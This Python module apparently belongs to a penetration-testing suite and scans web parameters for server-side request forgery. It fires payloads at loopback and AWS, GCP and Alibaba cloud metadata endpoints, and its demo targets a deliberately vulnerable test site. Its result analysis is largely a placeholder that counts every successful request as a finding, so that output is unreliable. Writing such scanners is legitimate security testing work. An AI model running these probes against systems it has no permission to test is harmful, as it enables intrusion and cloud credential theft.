# RedOpsSuite/modules/ssrfhunter.py
import requests
import time
import urllib.parse
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging

# --- Setup basic logging for standalone execution ---
logger = logging.getLogger(__name__)
logger.propagate = False
logger.setLevel(logging.DEBUG)
if not logger.handlers:
    ch = logging.StreamHandler()
    ch.setLevel(logging.DEBUG)
    formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
    ch.setFormatter(formatter)
    logger.addHandler(ch)
# --- End logging setup ---

class SSRFHunter:
    """
    A basic Server-Side Request Forgery (SSRF) detection tool for RedOpsSuite.
    Tests URL parameters with payloads designed to trigger SSRF.
    """

    def __init__(self, default_timeout=10, max_workers=5, delay=0.1, user_agent=None, collaborator_server=None):
        """
        Initializes the SSRFHunter.

        Args:
            default_timeout (int): Default timeout for HTTP requests (seconds). Default 10.
            max_workers (int): Maximum number of concurrent workers for scanning. Default 5.
            delay (float): Delay (in seconds) between requests to be polite/rate-limit aware. Default 0.1.
            user_agent (str, optional): Custom User-Agent string. If None, uses requests' default.
            collaborator_server (str, optional): Base URL of an external collaborator service
                                                 (e.g., 'http://abcdef123456.interact.sh').
                                                 If provided, unique subdomains will be generated for payloads.
        """
        self.default_timeout = default_timeout
        self.max_workers = max_workers
        self.delay = delay
        self.session = requests.Session()
        if user_agent:
            self.session.headers.update({'User-Agent': user_agent})
        self.collaborator_server = collaborator_server
        self.results = [] # Store scan results
        logger.info(f"SSRFHunter module initialized with timeout={default_timeout}s, max_workers={max_workers}, delay={self.delay}s, collaborator={collaborator_server}")

    def _generate_collaborator_payload(self, prefix="ssrf-test"):
        """
        Generates a unique payload using the configured collaborator server.

        Args:
            prefix (str): A prefix for the generated subdomain.

        Returns:
            str: A full URL payload using the collaborator service, or None if not configured.
        """
        if not self.collaborator_server:
            logger.debug("SSRFHunter: No collaborator server configured. Cannot generate collaborator payload.")
            return None
        try:
            # Generate a unique-ish subdomain
            unique_id = str(uuid.uuid4()).replace('-', '')[:16] # Take first 16 chars of UUID
            subdomain = f"{prefix}-{unique_id}"
            # Construct the full collaborator URL
            # Parse the base server to get scheme and domain
            parsed_base = urllib.parse.urlparse(self.collaborator_server)
            scheme = parsed_base.scheme if parsed_base.scheme else 'http'
            base_domain = parsed_base.netloc if parsed_base.netloc else parsed_base.path

            if not base_domain:
                logger.error(f"SSRFHunter: Invalid collaborator server URL format: {self.collaborator_server}")
                return None

            collaborator_url = f"{scheme}://{subdomain}.{base_domain}"
            logger.debug(f"SSRFHunter: Generated collaborator payload: {collaborator_url}")
            return collaborator_url
        except Exception as e:
            logger.error(f"SSRFHunter: Error generating collaborator payload: {e}")
            return None

    def _send_ssrf_probe(self, base_url, method, original_params, original_data, original_headers, param_name, payload_url):
        """
        Sends a single HTTP request with an SSRF payload injected into a specific parameter.

        Args:
            base_url (str): The base target URL.
            method (str): The HTTP method (GET, POST).
            original_params (dict): Original query parameters.
            original_data (dict): Original POST data.
            original_headers (dict): Original HTTP headers.
            param_name (str): The name of the parameter to inject the payload into.
            payload_url (str): The SSRF payload URL to inject.

        Returns:
            dict: A dictionary containing request details, response, and potential SSRF indicators.
        """
        result = {
            "target": {
                "url": base_url,
                "method": method.upper(),
                "parameter": param_name,
                "original_params": original_params.copy(),
                "original_data": original_data.copy() if original_data else None,
                "original_headers": original_headers.copy(),
            },
            "payload": {
                "type": "collaborator" if self.collaborator_server and payload_url and self.collaborator_server in payload_url else "internal_ip",
                "url": payload_url
            },
            "request": {
                "final_url": base_url,
                "final_params": original_params.copy(),
                "final_data": original_data.copy() if original_data else None,
                "final_headers": original_headers.copy(),
            },
            "response": {
                "status_code": None,
                "headers": {},
                "body_preview": "",
                "time_elapsed": None
            },
            "indicators": {
                "potential_ssrf": False,
                "status_change": False,
                "time_delay": False,
                "content_change": False,
                "collaborator_interaction": False # Placeholder for future integration
            },
            "notes": "",
            "error": None
        }

        try:
            # Inject payload into the specified parameter
            # For GET, inject into params. For POST, inject into data.
            if method.upper() == 'GET' and result['request']['final_params'] is not None:
                result['request']['final_params'][param_name] = payload_url
                # Reconstruct URL with new params if needed, or let requests handle it
                # requests.get(url, params=params) handles this.
            elif method.upper() == 'POST' and result['request']['final_data'] is not None:
                result['request']['final_data'][param_name] = payload_url
            else:
                # If the param isn't in the expected place (params for GET, data for POST),
                # try injecting into params anyway as a fallback.
                # This handles cases where a POST endpoint also reads from query params.
                if result['request']['final_params'] is not None:
                     result['request']['final_params'][param_name] = payload_url
                     logger.debug(f"SSRFHunter: Fallback injection into params for {method} {base_url} param {param_name}.")

            start_time = time.time()
            # Prepare request arguments
            req_kwargs = {
                "url": base_url,
                "headers": result['request']['final_headers'],
                "timeout": self.default_timeout,
                "allow_redirects": True # Follow redirects to see final destination/content
            }

            # Add parameters/data based on method
            if method.upper() == 'GET':
                req_kwargs["params"] = result['request']['final_params']
            elif method.upper() == 'POST':
                req_kwargs["params"] = result['request']['final_params'] # Query params can exist for POST too
                req_kwargs["data"] = result['request']['final_data']

            # Send request
            if method.upper() == 'GET':
                resp = self.session.get(**req_kwargs)
            elif method.upper() == 'POST':
                resp = self.session.post(**req_kwargs)
            else:
                # For less common methods, use requests.request
                resp = self.session.request(method.upper(), **req_kwargs)

            end_time = time.time()

            result['response']['status_code'] = resp.status_code
            result['response']['headers'] = dict(resp.headers)
            result['response']['body_preview'] = resp.text[:500] + ("..." if len(resp.text) > 500 else "")
            result['response']['time_elapsed'] = end_time - start_time

            # --- Basic SSRF Indicator Analysis ---
            # 1. Status Code Change (Very basic)
            # This would ideally compare to a baseline request.
            # For now, we just log the status.
            logger.debug(f"SSRFHunter: Probed {method.upper()} {base_url} param {param_name} with payload {payload_url}. Status: {resp.status_code}.")

            # 2. Time Delay (Placeholder)
            # A real check would compare elapsed time to a baseline.
            # if result['response']['time_elapsed'] > (baseline_time * 1.5): # Arbitrary threshold
            #     result['indicators']['time_delay'] = True
            #     result['notes'] += f"Response took longer ({result['response']['time_elapsed']:.2f}s) than expected. "

            # 3. Content Change (Placeholder)
            # A real check would diff the response body with a baseline.
            # if resp.text != baseline_resp.text:
            #     result['indicators']['content_change'] = True
            #     result['notes'] += "Response content differs from baseline. "

            # 4. Specific Content Indicators (Very basic example for file:// payloads)
            # Check for common strings that might indicate successful SSRF to local files
            # This is highly dependent on the target app and is not reliable.
            # if "root:" in resp.text and "/etc/passwd" in payload_url:
            #     result['indicators']['potential_ssrf'] = True
            #     result['notes'] += "Potential file-read SSRF indicated by presence of '/etc/passwd' content. "
            #     logger.warning(f"SSRFHunter: Potential file-read SSRF detected for {base_url} param {param_name}.")

            # 5. Collaborator Interaction (Placeholder for future)
            # This would involve polling the collaborator service for interactions
            # related to the unique subdomain used in the payload_url.
            # if self.collaborator_server and payload_url and self.collaborator_server in payload_url:
            #     # result['indicators']['collaborator_interaction'] = check_collaborator_for_interaction(payload_url)
            #     pass # Implementation depends on the collaborator API

            logger.info(f"SSRFHunter: Tested {method.upper()} {base_url} param '{param_name}' with payload '{payload_url[:50]}...'. Status: {resp.status_code}.")

        except requests.exceptions.Timeout:
            result['error'] = "Request timed out"
            logger.warning(f"SSRFHunter: Request to {base_url} ({method} param {param_name}) timed out.")
        except requests.exceptions.RequestException as e:
            result['error'] = f"Request failed: {str(e)}"
            logger.error(f"SSRFHunter: Request to {base_url} ({method} param {param_name}) failed: {e}")
        except Exception as e:
            result['error'] = f"Unexpected error: {str(e)}"
            logger.error(f"SSRFHunter: Unexpected error testing {base_url} ({method} param {param_name}): {e}", exc_info=True)

        # Apply inter-request delay
        if self.delay > 0:
            time.sleep(self.delay)

        return result

    def hunt(self, targets, payload_types=None, custom_payloads=None, parameters_to_test=None):
        """
        Hunts for SSRF vulnerabilities in a list of targets.

        Args:
            targets (list): A list of dictionaries, each defining a target request.
                           Example: [{'url': 'http://target.com/redirect', 'method': 'GET',
                                      'params': {'url': 'http://example.com'}, 'data': None, 'headers': {}}]
            payload_types (list, optional): Types of payloads to use.
                                           Options: 'internal_ip', 'collaborator'.
                                           If None, uses 'internal_ip'. If collaborator is configured, adds it.
            custom_payloads (list, optional): A list of custom payload URLs to inject.
            parameters_to_test (list, optional): Specific parameter names to test.
                                                 If None, tests all parameters found in `params` or `data`.

        Returns:
            list: A list of result dictionaries for each probe sent.
        """
        if not targets:
            logger.warning("SSRFHunter: No targets provided for hunting.")
            return []

        # Define default payload types
        if payload_types is None:
            payload_types = ['internal_ip']
            # If a collaborator is configured, add it as a payload type
            if self.collaborator_server:
                payload_types.append('collaborator')

        logger.info(f"SSRFHunter: Starting SSRF hunt on {len(targets)} targets with payload types {payload_types}.")

        # Define common internal IP payloads
        internal_ip_payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://127.0.0.1:22", # Common service port
            "http://127.0.0.1:80",
            "http://169.254.169.254", # AWS Metadata URL
            "http://169.254.169.254/latest/meta-data/", # Specific AWS metadata path
            "http://metadata.google.internal", # GCP Metadata URL
            "http://100.100.100.200/latest/meta-data/", # Alibaba Cloud
            # Add more as needed
        ]

        # --- Generate Payloads ---
        all_payloads = []

        # Add internal IP payloads if requested
        if 'internal_ip' in payload_types:
            all_payloads.extend(internal_ip_payloads)
            logger.debug(f"SSRFHunter: Added {len(internal_ip_payloads)} internal IP payloads.")

        # Add collaborator payloads if requested and configured
        if 'collaborator' in payload_types and self.collaborator_server:
            # Generate a few unique collaborator payloads
            for i in range(3): # Generate 3 unique payloads
                collab_payload = self._generate_collaborator_payload(prefix=f"ssrfhunt-{i}")
                if collab_payload:
                    all_payloads.append(collab_payload)
            logger.debug(f"SSRFHunter: Added {len([p for p in all_payloads if self.collaborator_server and self.collaborator_server in p])} collaborator payloads.")

        # Add custom payloads
        if custom_payloads:
            all_payloads.extend(custom_payloads)
            logger.debug(f"SSRFHunter: Added {len(custom_payloads)} custom payloads.")

        if not all_payloads:
            logger.error("SSRFHunter: No payloads generated. Cannot start hunt.")
            return []

        logger.info(f"SSRFHunter: Generated {len(all_payloads)} total payloads for injection.")

        # --- Prepare Probe Tasks ---
        probe_tasks = []
        for target_dict in targets:
            url = target_dict.get('url')
            method = target_dict.get('method', 'GET')
            params = target_dict.get('params', {})
            data = target_dict.get('data') # Can be None, dict, or string
            headers = target_dict.get('headers', {})

            if not url:
                logger.warning("SSRFHunter: Skipping target entry due to missing 'url'.")
                continue

            # Determine which parameters to test
            params_to_iterate = []
            if parameters_to_test:
                # Test only specified parameters, if they exist in params or data
                params_to_iterate = [p for p in parameters_to_test if p in params or (isinstance(data, dict) and p in data)]
            else:
                # Test all parameters found in params or data
                param_names_in_params = list(params.keys()) if params else []
                param_names_in_data = list(data.keys()) if isinstance(data, dict) else []
                params_to_iterate = list(set(param_names_in_params + param_names_in_data)) # Unique list

            if not params_to_iterate:
                logger.info(f"SSRFHunter: No injectable parameters found for {method} {url}. Skipping.")
                continue

            logger.debug(f"SSRFHunter: Identified parameters to test for {url}: {params_to_iterate}")

            # Create a task for each parameter/payload combination
            for param_name in params_to_iterate:
                for payload_url in all_payloads:
                    probe_tasks.append({
                        'base_url': url,
                        'method': method,
                        'original_params': params,
                        'original_data': data,
                        'original_headers': headers,
                        'param_name': param_name,
                        'payload_url': payload_url
                    })

        if not probe_tasks:
            logger.warning("SSRFHunter: No probe tasks generated. Check targets and parameters.")
            return []

        logger.info(f"SSRFHunter: Generated {len(probe_tasks)} probe tasks ({len(targets)} targets, {len(all_payloads)} payloads, varying params).")

        # --- Execute Probes Concurrently ---
        all_results = []
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            # Submit tasks
            future_to_desc = {}
            for task in probe_tasks:
                desc = f"{task['method']} {task['base_url']} [{task['param_name']}] -> {task['payload_url'][:30]}..."
                future = executor.submit(
                    self._send_ssrf_probe,
                    task['base_url'],
                    task['method'],
                    task['original_params'],
                    task['original_data'],
                    task['original_headers'],
                    task['param_name'],
                    task['payload_url']
                )
                future_to_desc[future] = desc

            # Collect results as they complete
            completed = 0
            for future in as_completed(future_to_desc):
                desc = future_to_desc[future]
                completed += 1
                try:
                    result = future.result()
                    all_results.append(result)
                    logger.debug(f"SSRFHunter: Completed probe ({completed}/{len(probe_tasks)}): {desc}")
                except Exception as e:
                    logger.error(f"SSRFHunter: Task {desc} generated an exception: {e}")
                    # Append a result indicating the task failure
                    all_results.append({
                        "target": {"url": "N/A (Task Error)", "method": "N/A", "parameter": "N/A"},
                        "payload": {"type": "N/A", "url": "N/A"},
                        "request": {},
                        "response": {},
                        "indicators": {"potential_ssrf": False},
                        "notes": "",
                        "error": f"Task execution failed: {str(e)}"
                    })

        logger.info(f"SSRFHunter: SSRF hunt completed. Sent {len(probe_tasks)} probes, analyzed {len(all_results)} results.")
        self.results.extend(all_results)
        return all_results

    def analyze_results(self, results=None):
        """
        Performs a basic analysis of SSRF hunt results to highlight potential findings.

        Args:
            results (list, optional): List of results to analyze. Uses `self.results` if None.

        Returns:
            dict: A summary of the analysis.
        """
        if results is None:
            results = self.results

        if not results:
            logger.info("SSRFHunter: No results to analyze.")
            return {"summary": "No results available.", "findings": []}

        logger.info("SSRFHunter: Analyzing SSRF hunt results...")
        findings = []
        total_probes = len(results)
        # Count results with any positive indicators (basic)
        potential_ssrf_count = sum(1 for r in results if r.get('indicators', {}).get('potential_ssrf') or r.get('error') is None) # Assume successful request is analyzed

        summary = {
            "total_probes": total_probes,
            "potential_ssrf_indicators": potential_ssrf_count,
        }

        # Flag results with positive indicators for review (basic logic)
        # A real analyzer would be much more sophisticated.
        for result in results:
            # For now, flag results without errors as needing review.
            # A more complex analyzer would look for diffs, time delays, specific content.
            if result.get('error') is None:
                 findings.append(result)

        logger.info(f"SSRFHunter: Analysis complete. Summary: {summary}")
        return {"summary": summary, "findings": findings}

    def get_results(self):
        """Returns the results from the last hunt run."""
        return self.results

    def clear_results(self):
        """Clears the stored results."""
        self.results = []


# Example usage (if run directly)
if __name__ == '__main__':
    # Example: Hunt SSRF on a hypothetical target
    # Note: Running this against real targets without permission is illegal.
    hunter = SSRFHunter(
        default_timeout=15,
        max_workers=3,
        delay=0.2,
        # Example collaborator server (replace with a real one like interactsh or Burp Collab)
        # collaborator_server="http://your-collaborator-server.com"
        collaborator_server=None # Disabled for this example
    )

    # Define targets (these are examples, replace with real targets for testing)
    test_targets = [
        {
            "url": "http://testphp.vulnweb.com/redir.php", # Example target known to have SSRF-like behavior
            "method": "GET",
            "params": {"url": "http://example.com"}, # Parameter 'url' is vulnerable
            "data": None,
            "headers": {}
        },
        # Add more targets as needed
    ]

    # Define specific parameters to test (optional)
    # test_parameters = ["url", "redirect"] # Only test these params

    print("--- SSRFHunter Basic Test ---")
    print(f"Targets: {test_targets}")
    print("-" * 30)

    # Run the hunt
    results = hunter.hunt(
        targets=test_targets,
        payload_types=['internal_ip'], # Use internal IP payloads
        # payload_types=['internal_ip', 'collaborator'], # If collaborator was configured
        # parameters_to_test=test_parameters # Optional
    )

    # Analyze results
    analysis = hunter.analyze_results(results)
    print("\n--- SSRF Hunt Analysis Summary ---")
    print(analysis['summary'])
    print("\n--- Potential SSRF Findings (Requests Sent Successfully) ---")
    if analysis['findings']:
        for finding in analysis['findings'][:5]: # Show first 5
            print(f"URL: {finding['target']['url']}")
            print(f"Method: {finding['target']['method']}")
            print(f"Parameter: {finding['target']['parameter']}")
            print(f"Payload: {finding['payload']['url']}")
            print(f"Status Code: {finding['response'].get('status_code', 'N/A')}")
            print(f"Notes: {finding['notes']}")
            print(f"Error: {finding['error']}")
            print("-" * 20)
        if len(analysis['findings']) > 5:
            print(f"... and {len(analysis['findings']) - 5} more successful probes.")
    else:
        print("No probes were sent successfully or no basic indicators found in this simple test.")

    print("-" * 30)
    print("SSRFHunter demo completed.")
